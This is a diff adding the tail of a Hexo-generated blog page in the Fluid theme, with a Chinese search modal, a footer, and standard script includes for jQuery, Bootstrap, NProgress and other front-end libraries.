+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
